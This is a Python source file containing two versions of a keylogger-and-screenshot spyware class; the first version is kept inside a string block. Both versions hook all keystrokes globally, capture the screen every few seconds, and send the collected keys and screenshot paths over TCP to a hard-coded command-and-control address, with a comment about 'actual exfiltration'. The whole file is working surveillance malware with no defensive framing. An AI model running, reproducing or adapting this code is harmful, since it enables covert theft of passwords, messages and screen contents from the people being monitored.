"""import socket
import time
import json
import os
import pyautogui
import keyboard

# --- CONFIGURATION ---
# Set to '127.0.0.1' if your server is on the same machine.
# Change to a remote IP (e.g., '192.168.1.5') for actual exfiltration.
C2_SERVER_IP = "192.168.2.111"
C2_SERVER_PORT = 5555

SEND_INTERVAL = 10  # Seconds between data bursts
SCREENSHOT_INTERVAL = 5  # Seconds between screenshots
DATA_DIR = "./captured_data"



class Spyware:
    def __init__(self):
        self.keys = []
        self.screenshots = []

        # Create directory to store screenshots locally before sending
        if not os.path.exists(DATA_DIR):
            os.makedirs(DATA_DIR)

        print(f"[+] Initializing Spyware...")
        print(f"    C2 Server: {C2_SERVER_IP}:{C2_SERVER_PORT}")
        print(f"    Sending Data Every: {SEND_INTERVAL} seconds")
        print("[+] Keylogger Started. Start typing!")

    def on_key(self, key):
        #Callback for keypress events.
        try:
            # Convert key object to string
            k = str(key).replace("'", "")

            # Handle special keys for readability
            if k == "Key.space":
                k = " "
            elif k == "Key.enter":
                k = "\\n"
            elif k == "Key.backspace":
                k = "[BS]"

            self.keys.append(k)
        except Exception as e:
            pass

    def take_screenshot(self):
        #Take a screenshot and save it to the local directory.
        filename = f"{DATA_DIR}/screen_{int(time.time())}.png"
        try:
            pyautogui.screenshot(filename)
            self.screenshots.append(filename)
            print(f"[+] Screenshot saved: {filename}")
        except Exception as e:
            print(f"[-] Error taking screenshot: {e}")

    def send_data(self):
        #Send collected keys and screenshot paths to C2 via TCP Socket.
        if not self.keys and not self.screenshots:
            return

        payload = {
            "keys": self.keys,
            "screenshots": self.screenshots
        }

        json_data = json.dumps(payload)

        try:
            # Create socket connection
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((C2_SERVER_IP, C2_SERVER_PORT))

                # Send length of data first (4 bytes header)
                len_payload = len(json_data.encode('utf-8'))
                s.sendall(len_payload.to_bytes(4, byteorder='big'))

                # Send the actual JSON data
                s.sendall(json_data.encode('utf-8'))

            print(f"[+] Sent {len_payload} bytes to C2")

            # Clear buffer after successful send
            self.keys = []
            self.screenshots = []

        except Exception as e:
            print(f"[-] Failed to send data: {e}")

    def run(self):
        #Main execution loop.
        # Start listening for keystrokes globally
        keyboard.hook(self.on_key)

        try:
            while True:
                time.sleep(1)  # Check every second

                # Trigger screenshot if interval passed
                # Simple logic: take one screenshot per cycle for demo simplicity
                if len(self.screenshots) == 0 or \
                        (self.screenshots and
                         time.time() - float(
                                    self.screenshots[-1].split('_')[-1].replace('.png', '')) > SCREENSHOT_INTERVAL):
                    self.take_screenshot()

                # Trigger data send if interval passed OR keys accumulated
                if len(self.keys) >= 5 or (time.time() % SEND_INTERVAL < 0.1 and len(self.keys) > 0):
                    self.send_data()

        except KeyboardInterrupt:
            print("\n[-] Spyware stopped by user.")
            keyboard.unhook_all()

if __name__ == "__main__":
    spy = Spyware()
    spy.run()"""

import socket
import time
import json
import os
import pyautogui
import keyboard
import threading

# --- CONFIGURATION ---
C2_SERVER_IP = "192.168.2.111"  # Change to your server IP
C2_SERVER_PORT = 5555

SEND_INTERVAL = 10  # Seconds between automatic data bursts
SCREENSHOT_INTERVAL = 1  # Seconds between screenshots
MAX_KEYS_BEFORE_SEND = 50  # Send immediately if this many keys are collected
DATA_DIR = "./captured_data"


class Spyware:
    def __init__(self):
        self.keys = []
        self.screenshots = []
        self.last_send_time = time.time()
        self.last_screenshot_time = time.time()

        # Create directory to store screenshots locally before sending
        if not os.path.exists(DATA_DIR):
            os.makedirs(DATA_DIR)

        print(f"[+] Initializing Spyware...")
        print(f"    C2 Server: {C2_SERVER_IP}:{C2_SERVER_PORT}")
        print(f"    Sending Data Every: {SEND_INTERVAL} seconds")
        print("[+] Keylogger Started. Start typing!")

        # Hook keyboard in a separate thread to avoid blocking main loop
        self.key_thread = threading.Thread(target=self.listen_keys, daemon=True)
        self.key_thread.start()

    def listen_keys(self):
        """Listener for keypress events."""
        try:
            keyboard.hook(self.on_key)
            # Keep the thread alive
            while True:
                time.sleep(1)
        except Exception as e:
            print(f"[-] Key listener error: {e}")

    def on_key(self, key):
        """Callback for keypress events."""
        try:
            # Convert key object to string
            k = str(key).replace("'", "")

            # Handle special keys for readability
            if k == "Key.space":
                k = " "
            elif k == "Key.enter":
                k = "\\n"
            elif k == "Key.backspace":
                k = "[BS]"
            elif k == "Key.tab":
                k = "[TAB]"

            self.keys.append(k)
        except Exception as e:
            pass

    def take_screenshot(self):
        """Take a screenshot and save it to the local directory."""
        filename = f"{DATA_DIR}/screen_{int(time.time())}.png"
        try:
            pyautogui.screenshot(filename)
            self.screenshots.append(filename)
            print(f"[+] Screenshot saved: {filename}")
        except Exception as e:
            print(f"[-] Error taking screenshot: {e}")

    def send_data(self):
        """Send collected keys and screenshot paths to C2 via TCP Socket."""
        if not self.keys and not self.screenshots:
            return

        payload = {
            "keys": self.keys,
            "screenshots": self.screenshots
        }

        json_data = json.dumps(payload)
        data_bytes = json_data.encode('utf-8')

        try:
            # Create socket connection with timeout
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)  # 5 seconds timeout
                s.connect((C2_SERVER_IP, C2_SERVER_PORT))

                # Send length of data first (4 bytes header)
                len_payload = len(data_bytes)
                s.sendall(len_payload.to_bytes(4, byteorder='big'))

                # Send the actual JSON data
                s.sendall(data_bytes)

            print(f"[+] Sent {len_payload} bytes to C2")

            # Clear buffer after successful send
            self.keys = []
            self.screenshots = []
            self.last_send_time = time.time()  # Reset timer

        except socket.timeout:
            print("[-] Connection timeout while sending data.")
        except Exception as e:
            print(f"[-] Failed to send data: {e}")

    def run(self):
        """Main execution loop."""
        try:
            while True:
                current_time = time.time()

                # Check if it's time for a screenshot
                if current_time - self.last_screenshot_time >= SCREENSHOT_INTERVAL:
                    self.take_screenshot()
                    self.last_screenshot_time = current_time

                # Check if it's time to send data (interval OR max keys reached)
                elif current_time - self.last_send_time >= SEND_INTERVAL or len(self.keys) >= MAX_KEYS_BEFORE_SEND:
                    self.send_data()

                time.sleep(0.5)  # Small sleep to prevent CPU spinning

        except KeyboardInterrupt:
            print("\n[-] Spyware stopped by user.")
            keyboard.unhook_all()


if __name__ == "__main__":
    spy = Spyware()
    spy.run()